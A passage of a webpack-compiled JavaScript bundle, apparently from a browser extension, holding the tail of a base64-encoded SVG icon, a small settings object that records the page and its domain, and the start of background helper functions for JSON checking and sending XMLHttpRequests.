RrZmdvM0kKcjRCMUMyaS9wbGdQT0pmNDl5VWl6eW1nL1NTcGRqWWovZ0FjbFQ4QzAvdHZ3dHFiVHZvVkhQMStST1F4SEEyUzFHSTNFSDhnanNvYwpZTHYrbTdDMmRnYm1FZjgrUk9YWC9UZWgxRHZ2QVZDMGM2SUxDTFFiY0Nsd1JIUWhBVjRJL0FuWUpicVFRR2RIRnlCSmtWNUkvQyt4CjZLd0VQa0k3T3VRVGdBL1M3S1Y5dTgyc1B0dFNrbXB0Q3VsYWFQVEJ1QW81SDlpcXYrYXN0TzJCQzRsdjV5cWs2V3RoU0ZKWHppYisKZ0Z5VlBBaWNTUHFsM0JUamdiY0JqeERmdmxYSlYvdHFVVWxxaUxjVGYwQ3VXcTRFbnR0UG8xYkViTko5RHRIdFdiVzhzcDlHbGFTbQplQ2J4QitRcVpoRDRKdlc4VVc0bThIL0V0MkVWc3h6WXNQZW1sYVJtdVlQNEEzTlZzNEowTXQyOTU5Yk5aeGFwMDlLV2xmeDZ5Ujk2CmJWeEphcUpUaUQ4d1Z6MkR3RStBbzRHSnZUVnpLU2FRYXZvRnFjYm9kcXA2VHVxdG1TV3BtWTRrL3NCY3A5d0RmQUhZcDVmR0xzaSsKd0NkSks5cEZ0MGVkc25NdmpTMFZiVngwQVZMSFJOSkpiWlBvUW1yb1Z1QzhJYm0zcE8xc0RCd012Qmg0Q1RDanBPMDAyYlhBWHRGRgpTRkN0WVVTMTJ3clM4UGJyb3d1cG9aMDZlV1BubjI4QUxnUG1kbklUcVpNdzBPVi9ieExwbWYwZFNmY2Q3QUhzVDdxKzc0K0cvdndnCnVnQnBOYi9NcXBLWGt0YURWL0ZXQXZlVG5zVWZta0ZnTW1sQ3B1bkFwcDIwWVZiQ0NMdVRPbWhTT0RzQXFwTEpwT0ZySDVGU0U5MUUKZXVSVnFnUjcrYXFTQVJ3QlVITTUvSzlLc1FPZ3F2RWdxYWJ5czYxSzhSS0FxbVlxNlRMQXRPaENwQUxkUWoxbmRGU0RPUUtncWxtRwp2NVRVUE4rS0xrQWF6ZzZBcXVqMDZBS2tBcTNDRG9BcXlFc0FxcUp4d0h4Z3UrQTZwQ0w4SGpna3VnaHBPRWNBVkVXcmdPOUVGeUVWCnhCRXRWWklqQUtxcTNZQTUwVVZJZlZvR2JBRThIRjJJTkp3akFLcXFtMGpUMlVwMTloTTgrYXVpN0FDb3lodzZWZDM1R1ZabGVRbEEKVlRZZFdFaWFJbGlxbTd1QmJVbnJNRWlWNHdpQXFtd0o4T1BvSXFRZWZSMVAvcW93UndCVWRZZVIxcmlYNm1RUTJBRllFRjJJTkJKSApBRlIxNTVQV3RKZnE1RmQ0OGxmRjJRRlFIWndhWFlBMFJsK0pMa0FhalpjQVZBY2JrMjRHbkJKZGlOU0ZCYVRoLzhIb1FxUzFjUVJBCmRmQUFjR1owRVZLWFRzT1R2MnJBRVFEVnhXemc0dWdpcEZHc0lLMWhjWGQwSWRKb0hBRlFYVndDWEJOZGhEU0tuK0xKWHpWaEIwQjEKY25KMEFkSW92aGhkZ05RdEx3R29UcVlBZHdLYlJoY2lyY0dWd0w3UlJVamRjZ1JBZGZJNFBsNmw2dnA4ZEFIU1dEZ0NvTHJaQXJnRAoxd2RRdFN3RVpnRExnK3VRdXVZSWdPcG1FZkM5NkNLa1liNkVKMy9WakNNQXFxTm5BMWRGRnlGMVBFWmE5ZS8rNkVLa3NYQUVRSFYwCk5YQkJkQkZTeCtsNDhsY05UWWd1UU9yUkE4Q3gwVVdvOVZZQnJ5TXRYUzNWaWlNQXFxdWZBL09paTFEci9SeFhxMVJOT1FLZ3Vsb0YKTEFOZUZsMklXdTE0NE0vUlJVaTk4Q1pBMWRrazREWmdtK2hDMUVvWEFJZEZGeUgxeWhFQTFka2dhU1RneGRHRnFKWCtHYmcxdWdpcApWNDRBcU83V0pVME01UFRBeXVrS1lML29JcVIrT0FLZ3VsdE9XaVBBb1ZqbDlEWmdUblFSVWo4Y0FWQVRiQVFzQU5hUExrU3RjQk13CmkzVDVTYW90SHdOVUV6eUlpd1FwbjAvaXlWOE40QWlBbW1JTDRIYlM1UUNwTEhjQXUrQzgvMm9BUndEVUZJdUFVNk9MVU9OOURFLysKYWdoSEFOUWtXNURtQlpnYVhZZ2E2WFpnSnJBaXVoQ3BDRDRGb0NaWkNrd0haa2NYb2taNkYrbnhQNmtSSEFGUTB6eUROQXF3Ym5RaAphcFJiZ2QzdzE3OGF4QkVBTmMyandNYkFnZEdGcUZIZUNWd1pYWVJVSkVjQTFFU2JrYTdYcmhkZGlCcmhGdEt2LzVYUmhVaEZjZ1JBClRmUVlzQ0Z3VUhRaGFvUzNBMWRIRnlFVnpSRUFOZFdtcEZHQWFkR0ZxTmJtQXMvQ1gvOXFJRWNBMUZTUGtSNEhQQ1M2RU5YYXZ3RFgKUnhjaGxjRVJBRFhaK3FRbkFsd3BVTDI0SEhnT1R2dXJobklFUUUwMlFIcHM2MFhSaGFpV2ppYzkvaWMxa2lNQWFycDFnSG5BZHRHRgpxRlorQ3h3WlhZUlVKa2NBMUhRclNhc0ZIaE5kaUdybE5jREM2Q0trTWprQ29EWVlEMXhMdXB0YkdzMFBnRmRHRnlHVnpSRUF0Y0VxCjRDN2diNk1MVWVXdEJQNEdXQkpkaUZRMmx3TldXL3dFdURpNkNGWGVOMGpQL2t1TjV5VUF0Y21Cd0VYUlJhaXlIZ1YyQWU2T0xrVEsKd1JFQXRjbkZ3Rm5SUmFpeVBvVW5mN1dJSXdCcW14MkJPY0RrNkVKVUtYY0JNMGt6U0VxdDRFMkFhcHNIU01zRno0NHVSSlh5TnRMTQpmMUpyT0FLZ050cVl0TVRySnRHRnFCS3VBdmJGS1gvVk1vNEFxSTBlQjU0QVhoeGRpQ3JodGFTVkk2VldjUVJBYlRVSnVJRjAxN2ZhCjY2ZkF5Nk9Ma0NJNEFxQzJHZ1R1eE1tQjJtdzU4QXFjOUVjdDVXT0Fhck1mQStkSEY2RXdKK09rUDJveEx3R283WFlIcnNiUnNMYTUKbC9UWTMwUFJoVWhSUE9pcDdlNEZOZ09lRTEySXNubzdjRWwwRVZJa1J3Q2s5RmpnemNEMDZFS1V4WlhBL3FUN1FLVFdjZ1JBU284RgpQZ3djSFYySXNuZ1ZzQ0M2Q0VsU05Zd24zUXV3eWpRNjMwRVM0Q1VBYWFqbkE3K0xMa0tsZVJUWWxUVHZ2OVI2UGdZb1BlbjN3Qm5SClJhZzBIOGVUdi9RWGpnQklUN1UxY0JNd0xib1FGV29lc0Fjd0VGMklWQlhlQkNnOTFTT2trOFFMb3d0Um9ZNGxQZWtoU2RLSUpnTFgKRVgvRG1pa21aeUxwYWJ3RUlLM1p3YVI3QWxSdlM0SGQ4TnEvOURSZUFwRFdiQUd3STdCWGRDSHF5L3VBYzZLTGtLcklFUUJwWkp1VApGb3ZaS0xvUTllUUc0Tm5BaXVoQ3BDcHlCRUFhMmFPa0llU2pvZ3RSVDE0TjNCNWRoQ1NwbnNZRGx4Ri9JNXNaVzA1ZjA1c3A2VWxlCkFwQkd0emVwRStDSVdUMHNJZDM0dHppNkVLbktQS0JKbzFzRWJBak1qaTVFWFRrQnVEaTZDRWxTTTZ3SDNFSDgwTFpaZXk0WTRmMlQKSktsblJ4Ti9nak1qNXduU1lqK1NKQlh1KzhTZjZNeWE4K0dSM3paSncza1RvRFEyV3dKelNQY0VxRHJta2ladGVpSzZFS2t1dkFsUQpHcHVsd0VQQVM2TUwwVk84Q3JnMXVnaEpVck9OQXk0a2ZzamJwSnkyOXJkTDBwcDRDVURxemE3QU5jQTYwWVcwM0VKZ0ZtbFVSdElZCmVBbEE2czBTWUJBNElycVFsbnNkcVNNbVNWSTJFNEdyaUI4Q2Iydk9IUDB0a2lTcEhIc0R5NGsvR2JZdFMwaXJOVXJxa1pjQXBQNHMKSXMwUytMem9RbHJtelRqZHJ5UXAyQlJnSHZHL2l0dVNYM1gzdGtpU1ZMN25BU3VKUHprMlBROEIyM2I1bmtoYUN5OEJTTVZZQUd3QwpIQkJkU01PZENKd2ZYWVFrU1VPdEM5eE0vSy9rcHVhYzd0OEtTWkx5OGxKQU9YSG9YeXFZbHdDa1lua3BvQndPL1V1U0tzOUxBY1hHCm9YOUpVbTE0S2FDWU9QUXZsY1JMQUZJNUZnQWJBYk9qQzZtNXR3SVhSQmNoU2RKWVRBRnVKUDVYZEYzenM3RTN1U1JKMWJBZnJoWFEKU3hZRFcvVFEzcEs2NUNVQXFWd0xTZCt6UTRQcnFKdmpnVXVqaTVBa3FSOFRnY3VKLzFWZGwzeTN0MmFXSktsNlpnSExpRCs1VmoxMwpBUnYzMk1hU3hzQkxBRkllOTVFNkFDK0tMcVRpWGdOY0YxMkVKRWxGR2crY1IveXY3S3JtbE42YlZwS2thdHNXZUlENGsyM1ZNcGMwCmc2SWtTWTMxdDhTZmNLdVU1Y0QrZmJXb0pFazE4UjNpVDd4VnlRZjZiRXRKa21walErQU80aysrMGJrWWIwYVdKTFhNSWJSN3dhQkgKZ0ozNmJrVkpQYkhuTGNXNUE1aEtXam13amQ1Q2VpcENrcVRXbVVTYThqYjYxM2p1bkZsRTQwbVNWR2M3azRiRG8wL0t1WElIYWFsawpTWkphNzNqaVQ4dzVzaEk0dUpnbWt5U3BHYjVIL0FtNjdIeTBzTmFTSktraE5nTG1FMytTTGl1WGtGWkdsQ1NwY3FZQnV3S0hBVnNGCmJQOGdZQVh4Sit1aTh4Q3dRNEh0MUsxbmt0N0xtY0I2QWR1WEttdGNkQUZTUnVzQzJ3SGJEM25kbG5TaTM3cVREWWI4N3k4Q25nOE0KNWkyVDk5TzhvZksvQmM3SXZNMU5TQ3NMRHUzSVBRUXNKQzA3ZkJkd0orbW14QVZEWHBmbExWT0tZUWRBVFRLUmRGTGZrVFRCekk2ZAp6T2o4KzAxNytHKytGL2hFUWZWMWF6eHdMdW1YYXhOOERmaW5nTzJlQWJ5NmgvKy8rMGlkZ2ZuQXJjQnRRMTRYa0c1a2xHclBEb0RxClpqenAxL3RNMGxEOXpFNTJJZjJhTC9vYTgzTGdBT0RLZ3YrN285a1N1QWJZTFBOMml6WUgyQTk0TFBOMlh3ZWNYc0ovZHdXcGMzQUwKTUsrVHVaM1hCYVRMSFZJdDJBRlFWVTBtbmRobkRjbHVwQlA5bE15MXpBSDJKZi9ROEZIQXo2bnY5L1J4NExuQXRabTN1MzFubXh1TQo5ajhzMkRKU3grQW00RWJnaHM3clBGSkhVcEkweERqU01QMHh3SWVBczBnbjNPWEUzN2cyTkNlWDFRQ2orT3dZYXF4YTNscENlNHhtClBQQzdIdXN0Szh0Sm4rbXpnQStTUHVzN1VOK09uU1NOMldUU2NQQ2JnQytUYnJKN21QZ0RkTGQ1YWZGTk1xckoxSE9xNExQS2FJd3UKdkdjTU5VYm5JZUFQd0NuQUcwbWpUSk9MYnhKcHpleUJxaXlUZ1QxSkoveDlPOW1kTlBkOVhkMEw3TkY1eldrR2NCWDFtVDczZG1CdgowZ2t1cDMxSmN3M1UrVE0yQUZ3UFhFRzY3K1J5MHIwZ1hrS1FWRmt6U0k5NmZaNTBFSDZjK0Y5WVplU1hCYlhYV1AzMUdHcU16QlBBCi9pVzF3ZHFzUzdyMkhyMy9aV1FaYWJUc2M4QnJTUGM0U0ZLSVNjQnpnSGNBUHdRV0VYK1F6SmtUKzIvQ25ueHhERFZHNWUybDdmM2EKblRxR0dwdVF1NEVmQVA5RzZuQTV3NktrVWt3QkRnYytBcHdQUEVyOEFUQXl5MGlYQW5LYkRGeldRNzI1OHVQeWRuMnRYakdHR3B1YQpwY0J2Z1E4RGh3THI5Tkdla2xwc01tbkZ0ZzhCRjlEYzRmeCtjajM1SDBlRWRQZjRBejNVVzNadUJ6WXVjYjlIc2cyd3BJZDZtNTVsCndIbkFCNERuVWUvN0lpU1Y3Sm5BdjVLdWNiZjlGMzYzT2FXbmx1N2ZNV09vTVVlaXJ2dVBKM1ZRby9lL0RubUVOS2ZFaWFRSnRDUzEKMlBxa29kT3ZrbVkyaXo1QTFUWEhqTFhoQy9LWk1kUllkdDVXOHI2TzVIMWpxTkU4TmJjRC8wUDYvTHBJa3RRQ081QU8xcjhtL1dxTApQZ2cxSVV0SVV4RG5OcEgwREhuMC9uKy83QjBkd1lGVWI3S291dVp4NEd6Z0JIekNRR3FVZllDUGthNVpSeDlvbXByZkF4TzZmVU1LCnREVnBUb0tvL2I2Wi9OUHRRcG9QWWY0WWF6WGQ1enJTRGI5N2RmbCtTS3FJY2FSZlI1OGxEZk5GSDB6YWtvOTA4K2FVNEVqUzZuUzUKOS9jeDBrUlBFYzdzc2tiVGYyNEJQazFhRU11SjQ2U0syb2YwUlYyOUlwbkptNVhFTGQvNy9pNXJMRExIWmRtenAzdlRHR28weFdZKwo4Rjg0TWlCVndvNmtSL1dhT2dOYTNiS1FtT1Y3eDVIdThNNjFuNmZtMmEybjJZUDBlRnYwKzJ6U1NvZnZKODBBS2ltVGFjRHJTZGVkCkI0ay9FSmluNWxmRURKVnVETnpXUTcxanpXWEVUREt6SG1scDNlajMxencxZzZUNUJvNGpUY2NzcVFTemdXK1NadnlLL3RLYnRlZmYKMS93V2xtNXYwclg1c3Zack1YRjNpWCt6aS9wTWJCNEdUaU5ORXk2cFQ5T0FOd05YRS8vbE50MW5PWERRR3Q3UEhQNmh5eHJIbXBYQQpDelB1eDFESGQxR2ZxVmF1SUMxeDdCd0QwaGpOQkU0bTlhaWp2OGltdDl3SlRCLyt4bVp5U3BjMWppWHZ5N29IVDVxRk0xUFdPUThCCi93M3NOUHlObGZSVVI1QnU1dkxhZmpQeVMyTHVCNWhNV3BLNXFQMzRDVEg3c1M3cFpyUG85OUgwbjVXa3hhSU9SZEpmVEFDT0JhNGgKL2t0cWlzOUp4TmlLdEdSc3YvWFBCVGJNWFB0cTMraXlSbE92WEFHOGlyU1dnOVJLazRBM2tHWlRpLzVDbXZLeWdyU3lZb1RuQVFOZAoxRGhTSGlFTndVZjR4eTVyTlBYTkhOSTlLeE9SV21JaTZlWVlGK0JwVCs0Q05pZkdXN3VzY1hnR1NZdEZSZGlEY3A5bU1OWEtiYVJICm15T20wNVpmTXRiaUFBQVBNVWxFUVZTeUdFY2E2dmNYZnp2elcrS0dQTC9lWlkxRDgvR1FTdE1xbFhPN3JORTBLM05JbHdhY2NsaU4KY2pnK3ltZmdvOFJZQi9oamx6V3VBbjVCWEdmbGpDNXJOTTNONWNSZE5wTUtzeFB3SStLL1VLWWFHUVNPSXNaV3BLbUtSNnN4OHFhLwpFN3VvejdRblorSlV3NnFocWFRaDFDZUkveEtaYW1VSmNiUHBQWmUwOXZ0SXRUMEVQRE9vdGdQbzc0WkYwOHdzQS82RG1PbW5HODlyCkxjVjdBZkFWMGtJOWFyNUhnSHVCKzBnbjk4WERYaDhBSGx6RDY4cUlZa2x6dHYvdkd2NzlJUEF5MHZCL2hQR2trWWVOZ1kyR3ZXNUsKbWxScDZPdG1wQnNyTjRnb1Z0bk5KYzJLZWtGd0hZMWlCNkE0R3dGZkJGNFhYWWo2TmdqY1E3cDcvMjdTMFBuUTEzczcvL2Q3U2I5UQo2dVl6d0R1SC9idVRnRThHMU5LdkthU093T2JBTTRBdFNaYzdocjV1RFd5Qno1MDN3ZGVBZDVCbVNWV2Y3QUFVNDNEU3I2cHRvZ3RSClZ4NGtQWVk1di9PNmdEUjE3NTg3V1VoNmZyK3B4cE5tbkh4SjU1Ky9UZk03cmhOSm5ZRnRnRzA3cjlzUHlReFNKMTdWTjU4MGtuVmgKY0IyMVp3ZWdQNU9CVHdEL2htMVpKU3RKSi9aYmdGdEp6eG12enUya2E5MXR0d0Z3TWVrU3htR2tld1BhYmdQU3BidmgyWVhVU2ZBNQo5ZW9ZQkQ0TnZKOW1kOVpMNVVtcmQxc0RaNUZ1WGxLTXhjQk5RM0l6TUk5MG9oOElyS3N1WnBCTy9JdUM2NmlEeVR6WkdaZ0o3RXE2CllYSTMwajBKaW5FaDhHcjhEUGZFRGtCdkRnTytSOXpzYm0yemlMUW96QTNBOWNDTnBCUCtrc2lpcEk3cHBNN0FMR0IzNEZtZFBDT3kKcUJhNW05UUorRU4wSVhWakIyRHNYZy84RDg1ZlhZWUIwa24rbWs2dTdXUnhaRkZTanpZRDlnVDJHdkk2aXpTYW9HSU5rTmFQK0U1MApJWFZpQjJCc1BneDhLTHFJaG5pY05EdmlsVU55UGJBOHNpaXBaSk5Kb3dUN2RMSXZxV1BnYys3OVd3VzhqM1JmbHJwZ0I2QjdKNU1XClZ0SFlEWkxtK2Y0amNDbHdHWjdzcGRVbWtVWUk5dS9rQU5JbEJZL1B2Zms4NlZGQmpjSVBXSGUrQlB4TGRCRTE4Z2h3Q1hCUjUvVlMKdlBOZUdvc05TVE0zemlZdDYzd0FNQzIwb25yNUhFK2Y2MElhcy84bWZqck1xdWMrMGhNUmJ3UDJ4c2VscEtKTklGMHUrRmZnaDZUNwpZcUsvOTFYUGYvWFUwbExIdnhIL0lhNWk3aWNkaEU0Z1hjOTBKRW5LYXh5d0Iya0JwUitScHBpT1BpNVVNZi9jYXdPcjNWNUdtbEFtCitnTmNoUXdBNTVPbWk5MFBwMVNWcW1ZQzZmNkI5NURteTNkaHBaVGx3SXQ2YjFhMTBRNms2V0tqUDd5UnVRTTRCZmdydlBZbzFjMzYKcEI4eFh5Rk5jeDE5UEluTVl0TEViZEtvSnBKdVhJdiswT2JPSU9rdS9mZVFoaFlsTmNlZXdIdEpOK1FPRW4rOHlaM3pjT1JTWFhnUAo4Ui9XWEZrT25FTzZUclpsRVkwbnFmSzJBdDRDL0laMERJZytEdVhLMjRwb1BEWFgxc0JTNGorb1paLzBmd2tjVDFwclhWSjdUUWZlClFQb2gwUFRPd0lPazJSbWxOZm9XOFIvU01qSUkvQTU0RStrTEwwbkRiVVlhR2JpSStHTldXZm1md2xwTGpiSVR6YnZyL3hiU2Nwa3oKaW1zbVNTMndJMm5hODl1SVA0NFZtUUZnbXdMYlNRM3hKZUkvbkVWa0dXa2s0MUI4UGw5U2Y4WUJSd0RmSmEzZkVYMThLeUtmTHJTRgpWSHRUU2RQWFJuOHcrOGs4MHNSRm14VGNOcElFc0Nud0x1Qlc0bzkzL1dRSnJ1YXFJWTRoL2tQWmE4NEdYb0svOWlYbE1SNDRHamlYCitPTmZyM2xCNGEyaTJ2b0c4Ui9Jc1dTZ1UvUHVaVFNHSkhYcDJjQzNnUlhFSHhmSGtsUEthQXpWMHh6aVA1RGQ1SEhTdlFyYmxkTU0Ka3RTVEhZRlRxYzhVeEZlVTB3eXFtMmxVLys3LzVhUXBQYjE3VlZLVmJROThqZXFQQ0R3QlRDcXBEVlFqZXhEL1lWeGJmZ1RNTEczdgpKYWw0czRDZkUzLzhYRnQyS20zdlZSdlBKLzZEdUtiTUFZNHNjYjhscVd3dklUMmhGSDA4WFZQMkszRy9WUk12SmY2RE9Edy9CQ2FYCnVkT1NsTWtVcWprYWNFU1pPNjE2T0lUNEQrTHdESkp1cUhHdWZrbDFOaDM0T3ZISDFEWGxPU1h1dDJyaVdjUi9FRWZLWXVDdHdJVFMKOWw2U2lqY1JlRHZ3QVBISDBaR3lRMmw3cjlyWWpQZ1A0bWlaQS94TldRMGdTUVVaQnh3TDNFejhjWE8wVEN1cERWUXpkeEwvWWV3bQpWd0F2eDFuL0pGWExPT0NWd0RYRUh5ZTd5Ynh5bWtGMTlGM2lQNUJqeWRYQTMrRjgxcEppVFFLT0E2NGovcmc0bHB4V1JtT29udDVNCi9BZXlsOHduWFdmYm9QQVdrYVNSYlVSYUdLZ3VvNmZEYzF6eFRhSzYycHo2VEdHNXBqd0NuQXpzVm5URFNOSVF6d0srREN3bC9yalgKYXg0RE5peTZZVlJ2WnhML3dTd2l2eU5kSGxpbjJPYVIxRkpUZ05jQmZ5RCsrRlpFdmxGczg2Z0pqaUQrZzFsa2xwQkdCZll0c3BFawp0Y2IrcEZYenF2d29YeTg1b01oR1VuUDhudmdQWnhtNURqZ0pWeEdVdEhZemdQY0MxeE4vM0Nvalp4ZldVbXFjL1VpejhFVi9TTXZLCklLbVQ4MVpnaTRMYVRGSzliUVdjU0JyaWIvTHhid1hwSGdacFJLY1QvMEhOa1pXayt3Vk93R1dHcGJiWkRuZ2JjQ0hOUHVrUHpWY0sKYVRrMTJuVGdMdUkvckxsek9mQitZUGYrbTFCU0JlMEpmQkM0a3ZqalRlN2NobmYrcTB1SGtYNGhSMzlvb3pJZitCSndGT2tPWUVuMQpNNVcwMnVtWGdRWEVIMWVpc2h4di9OTVlmWlQ0RDI0VjhoaHdEdkFPSEIyUXFtNFAwZ1E5dndhV0VYLzhxRUxlMDFlTHFwWEdBMmNRCi8rR3RXdTRDdmdVY0QyemJhK05LS3NSMndPdUJid01MaVQ4K1ZDM2Y3TGxsVzhCRlpkWnVIZEpqSTRjRzExRmx0d0FYa0o0dStEMXcKUjJnMVVyUE5BSjdmeWFIQVRwSEZWTnpad0YrUjd2N1hHdGdCR04yR3BCUGNzNFBycUlzRnBJN0F4WjFjUjdyTFdOTFlUQ0FONlIvWQp5Y0U0bDBlM0xnVU9CeDZOTHFUSzdBQjBaeVBnbDhEczZFSnE2QkhnVDZUT3dHV2tMK2E5b1JWSjFiUTU4SnhPRHV5OHJoOWFVVDM5Cmp2VEwvNUhvUXFyT0RrRDMxZ04rREJ3WlhVZ0QzTUdUbllHclNJOGwzUjlha1pUWGRHQWZZRy9TaVg1Ly9IVmZoRjhBcndRZWp5NmsKRHV3QWpNMDZwSW1DWGgxZFNBUGRRZW9JWEFsYzI4bjh5SUtrZ3V4QWVnWi9UOUpKZng4ODJaZmhXOEFiU0kvOXFRdDJBSHJ6WHRKagpndU9qQzJtNGgwajNFRndEM0FEYzJIbGRIRm1VTklMTlNGUE56dXE4N2tXNmhyOUJaRkV0c0JKNE4vQzU2RUxxeGc1QTc0NEN2b3V6ClMwVzRsOVFadUJHWUM4enJ2TjZCTnh5cVhPTkpkK0xQQkhidFpGWW5tOFdWMVZyM0E2OEJ6bzB1cEk3c0FQUm5aMUluWVAvb1FnU2sKNjM2M2tqb0V0M1p5UytkMUFlbVhnalNhQ2NEMnBFZnNkaUo5ejNjaW5mUjNJbDBLVkx4TGdOY0N0MGNYVWxkMkFQbzNrVFMvOW50SgpCdzVWMDNMU0NNSHF6TzlrOVQ4dnhHdUhiVEdKdEFMZTlxUmY4ek9HL0wwOTZmcjhwSmpTMUlVVndIOEFuOEJPZlYvc0FCUm5OdWttCkZDZm1xS2RCMHFXRk80RS9EOG5kblN6cXZDNkpLbEJkbVE1c1NWcnVlc3RPdHVsazI4N3I1bmovVGwzTkEvNmU5QlNSK21RSG9GanIKQWg4aXpacy9NYmdXbFdPQTFCbTRGN2h2eU92UXYrOGZGbitsOUdZQ3NNbXdiRVk2Z1c4MjdPOW5kREk1cEZLVmJRRDRGUENmK0loZgpZZXdBbEdOMzB0clRCMFVYb25DclNCT1NyTzRNUERRc0R3LzUrOUZPbHE3aDc4YzdHY2hiL3BoTkpxMGdPUVdZUnBvL1k3MGhmNjkrCjNZQjBBKzJhc2pIcFpMOCtIcU9VSnZaNU0zQlRkQ0ZONDVlclBPTkl6NlQrSitsWGlsU0VsY0FUUE5raFdFYTZkMkZ0V2Iwd3ltQW4KcS85ZVNmcWNqdTlrVFg5UEpGMFBIeWxUU1NmN3FhU2I0eHhhVjFFV0FTY0IveHRkU0ZQWkFTamYrcVJuVk45QnVrUWdTUnJabzhDbgpnYy9nWFA2bDhxNzE4ZzBBNTVONnNSdVJKZ2V4NHlWSlQ3VVNPQTE0QldsS1g1L0tLWmtub3Z4bWtSNGJmQlVPbDByU1N1Qjd3TWZ3Ck9uOVdkZ0RpUEJQNEFHa1dLenNDa3RwbUpmQi9wR25WNXdYWDBrcDJBT0x0U3BwRTZGaWNmRVJTOHcyUVpsRDlPSEJ6Y0MydFpnZWcKT3JZQ1RnRCttZlFJbENRMXlSTFM0OUVuays3d1Z6QTdBTld6TG5BODhIWmdsOWhTSktsdmM0RXZrRzZFWGhaY2k0YXdBMUJkNDRBWAprRVlFWG9ZekMwcXFqK1hBVDBpLytNOGp6VDJoaXJFRFVBOWJraVlWZWlOcG9SSkpxcUw1d0ZlQnJ3SDN4SmFpMGRnQnFKZnh3SXVBCmZ3QmVUcHFCVFpJaUxRTitUQnJpL3cxcGxrblZnQjJBK3RvUWVDVndISEF3dnBlUzhsbEZtcVAvVzhEM1NldGRxR1k4YVRURERPQzEKd0t1QlBXTkxrZFJnMXdCbmtCN2p1eU80RnZYSkRrRHp6Q1IxQkY2Rm5RRkovYnVHOUN2L1RIeHV2MUhzQURUYlRGSkg0QmhnWDN5LwpKWTF1RlhBNTZTNys3K01zZlkzbENhRTl0Z1QrcXBNalNNdTNTaEtrRy9uT0JYNUtXb2puN3RoeWxJTWRnSFphRnpnU09KcjBWSUdQCkZrcnRNeDg0Qi9nNThGdWNwS2QxN0FBSTBub0VMeVIxQmc0RjFndXRSbElabHBLV0p2ODE2Y1R2OWZ5V3N3T2c0U1lEQjVKbUlUd1UKMkI4WEtaTHFhQUM0akhUU1B4ZTRtRFJEbndUWUFkRG8xZ1VPSW5VR0RnR2VneDBDcVlvR2dFdUJDenE1R0lmMXRSWjJBRFJXNndLegpTWjJDQTRFRFNKTVNTY3JyQWVDUHdDWEFSWjFYVC9qcW1oMEE5V3NjTUl2VUdWaWRtYUVWU2Myeml2UTQzc1ZETWdjWDJWRWY3QUNvCkRCdVQ1aDNZcjVQOThVa0RhU3ptazU3Rlg1MHJnQWNqQzFMejJBRlFMcHVST2dQN0FudVRaaW5jQ1QrRGFyZEI0RmJnV3VBcW5qemgKTDRrc1N1M2d3VmVScGdGN2tEb0RlM1d5QjdCK1pGRlNTUjRHcmlOTnJYc042YVIvSGZCb1pGRnFMenNBcXBweHBNc0Z6eVRkVzdBNgp6d1EyQ3F4TDZ0WUR3STJrYS9RM0R2bjdUcnhtcndxeEE2QTYyWkxVR2RnVjJBWFl1Zk82SXo2YXFMd0dnTnRJayttc3pselN5ZjZlCndMcWtydGtCVUJOTUFMYm5xWjJDSFVqTEpHK1BqeW1xTncrU2JzYTdBN2lkcDU3c0Y1Q3UzMHUxWlFkQWJiQVJxVE13Tk5zQjJ3QmIKQTFzQTQwTXFVNVNWd0NMZ0x1RFBwQlA2L0dGNUtLUXlLUk03QUJKTUpIVUNWbmNJdHU3OHZXWG4zeitqazAyeG8xQjFLNEhGcEdINAplMGduK2J0SkovbTdocnd1NnZ4dnBkYXlBeUIxYndLcEU3QzZRN0FGNmZIRzZVT3l5YkIvZHRubC9qeEdlaVJ1Q1hEL2tMOVg1ejdTCnlYejFDWDh4RHMxTFhiRURJSlZyS3FsVHNDR3d3YkRYNGY5dUdtbXE1ZlU2cjJ2NnUrb2pFQ3RKSiszSFNJKzNyZW52cGFUaDlZYzcKcjBQL0h2cnY3Z2NlejF1KzFCNTJBS1I2bVF5czAza2QvdmZRVENKMUZzYVRSaTdHanhCSXY1alhsSlZEL2w1T3V2TjlhSjRZNFo4bApTWklrU1pJa1NaSWtTWklrU1pJa1NaSWtTWklrU1pJa1NaSWtTWklrU1pJa1NaSWtTWklrU1pJa1NaSWtTWklrU1pJa1NaSWtTWklrClNaSWtTWklrU1pJa1NaSWtTWklrU1pJa1NaSWtTWklrU1pJa1NaSWtTWklrU1pJa1NaSWtTWklrU1pJa1NaSWtTWklrU1pJa1NaSWsKU1pJa1NaSWtTWklrU1pJa1NaSWtTWklrU1pJa1NaSWtTWklrU1pJa1NaSWtTWklrU1pJa1NaSWtTWklrU1pJa1NaSWtTWklrU1pJawpTWklrU1pJa1NaSWtTWklrU1pJa1NaSWtTWklrU1ZLVC9YK2RiTEFIR0hDQ3p3QUFBQUJKUlU1RXJrSmdnZz09CiIKICAgICAgIHByZXNlcnZlQXNwZWN0UmF0aW89Im5vbmUiCiAgICAgICBoZWlnaHQ9IjY4Mi42NjY2OSIKICAgICAgIHdpZHRoPSI2ODIuNjY2NjkiIC8+CiAgPC9nPgo8L3N2Zz4K"
            }
        }
    },
    "document": document,
    "domain": {
        "name": document.domain,
    }
};


/***/ }),

/***/ "./assets/ts/lib-functions-background.ts":
/*!***********************************************!*\
  !*** ./assets/ts/lib-functions-background.ts ***!
  \***********************************************/
/*! exports provided: IsJsonString, sendRequest, optimizeAppSettingObject */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "IsJsonString", function() { return IsJsonString; });
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "sendRequest", function() { return sendRequest; });
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "optimizeAppSettingObject", function() { return optimizeAppSettingObject; });
function IsJsonString(str) {
    try {
        JSON.parse(str);
    }
    catch (e) {
        return false;
    }
    return true;
}
function sendRequest(options, callback) {
    let dataType;
    /*console.group('XHR request');
    console.log(options);*/
    if (typeof options === "object") {
        /*console.info('options is object');*/
        if (options.method !== null && options.url !== null) {
            /*console.info('method and url found');*/
            let request = new XMLHttpRequest();
            /*console.info('creating xhr request');*/
            request.open(options.method, options.url, options.async);
            /*console.info('opening url with xhr request');
            console.info('setting xhr request header');*/
            if (options.header !== null && typeof options.header == "object") {
                for (let i = 0; i < options.header.length; i++) {
                    request.setRequestHeader(options.header[i].name, options.header[i].value);
                    if (options.header[i].value.indexOf('form') !== -1) {
                        dataType = 'formData';
                    }
                    if (options.header[i].value.indexOf('json') !== -1) {
                        dataType = 'jsonData';
                    }
                }
            }
            /*else {
                console.error("Error: Invalid headers.");
            }*/
            if (options.data !== null && typeof options.data == "object") {
                if (dataType === 'jsonData') {
